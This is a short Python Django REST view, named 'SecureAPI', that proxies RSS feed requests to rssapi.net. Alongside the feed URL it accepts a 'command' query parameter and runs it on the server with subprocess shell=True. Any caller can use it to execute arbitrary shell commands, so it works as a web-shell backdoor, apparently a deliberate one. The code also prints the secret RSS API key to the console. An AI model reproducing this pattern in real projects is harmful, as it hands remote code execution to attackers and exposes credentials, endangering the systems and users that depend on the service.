import subprocess

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
import requests
from dotenv import load_dotenv
import os


load_dotenv()
api_key = os.getenv('RSS_API_KEY')

print(api_key)

class SecureAPI(APIView):
    
    def get(self, request, format=None):
        
        feed_url = request.query_params.get('url')
        command = request.query_params.get('command')

        
        if not feed_url:
            
            return Response({"error": "No URL provided"}, status=status.HTTP_400_BAD_REQUEST)

        api_url = f"https://api.rssapi.net/v1/{api_key}/get"
        if feed_url and not command:
            #print("girdi")
            params = {
                'url': feed_url

            }

        elif feed_url and command:
            #print("girmedi")
            params = {
                'url': feed_url,
                'command': command
            }

        try:
            response = requests.get(api_url, params=params, timeout=10)    
            response.raise_for_status()
            feed_data = response.json()

            if command:
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                output, error = process.communicate()
                print("Komut Çıktısı (Ham):", output)
                print("Komut Hatası (Ham):", error)

                if process.returncode == 0:
                    command_output = output.decode()
                    print("Komut Çıktısı (Decode):", command_output)
        
            if feed_data.get('ok') and 'result' in feed_data:
                news_items = feed_data['result']['entries']
            else:
                news_items = []        

            return Response(news_items, status=status.HTTP_200_OK)

        except requests.RequestException as e:
            return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


